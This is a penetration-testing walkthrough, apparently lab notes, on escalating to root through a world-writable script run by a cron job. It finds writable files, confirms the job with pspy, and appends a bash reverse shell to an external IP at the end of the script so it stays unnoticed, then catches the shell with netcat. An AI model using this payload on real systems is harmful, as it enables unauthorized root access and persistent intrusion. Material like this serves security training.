Cron jobs automate admin tasks (backups, cleanup, etc.) on a schedule. Misconfigured cron jobs — especially those running as root with weak permissions — are a classic privesc vector.
## Cron Basics
- Created via `crontab` → stored per-user in `/var/spool/cron`.
- Format (6 fields): `minute hour day month weekday command`
  - Example: `0 */12 * * * /home/admin/backup.sh` → runs every 12 hours.
- **Root's crontab** is normally only editable by root/full-sudo users — but can still be abused indirectly.
- Apps sometimes drop cron files in `/etc/cron.d/`, which may be misconfigured to allow non-root edits.

## Attack Surface
Even without editing the crontab itself, look for:
- **World-writable scripts** that run as root via cron → append malicious commands.
- **Misconfigured schedules** — e.g. `*/3 * * * *` (every 3 min) instead of intended `0 */3 * * *` (every 3 hrs) — gives frequent execution windows.
- File timestamps (e.g. repeated backup files) can hint at cron frequency even without reading the crontab directly.

---

## Step 1 — Find Writable Files
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
Look for scripts in odd locations (e.g. `/dmz-backups/backup.sh`) that look cron-related.

## Step 2 — Confirm Suspicious Activity
Inspect directory contents/timestamps to spot a pattern:
```bash
ls -la /dmz-backups/
```
Example: `.tgz` backup files created every 3 minutes → strong signal of a misconfigured cron interval.

## Step 3 — Confirm via pspy (no root needed)
[pspy](https://github.com/DominicBreuker/pspy) monitors running processes/filesystem events via procfs — reveals cron jobs and commands run by other users in real time.
```bash
./pspy64 -pf -i 1000
```
- `-pf` → print commands + filesystem events
- `-i 1000` → scan every 1000ms

Output confirms: cron (UID=0/root) executes `/dmz-backups/backup.sh`, which tars `/var/www/html` into a timestamped archive.

---

## Step 4 — Exploit the Script

**⚠️ Always back up the original script before editing.**

Original `backup.sh`:
```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

Append a reverse shell one-liner to the **end** of the script (so original functionality still completes normally, avoiding suspicion/breakage):
```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

## Step 5 — Catch the Shell
Stand up a listener before the next cron run:
```bash
nc -lnvp 443
```

When the cron job fires (within the observed interval, e.g. 3 min), the script executes as root:
```
root@NIX02:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

**Takeaway:** Not the most common vector, but poorly configured cron jobs (bad scheduling + world-writable scripts running as root) are a reliable and quick win when found. Always confirm execution context with a tool like `pspy` before modifying anything.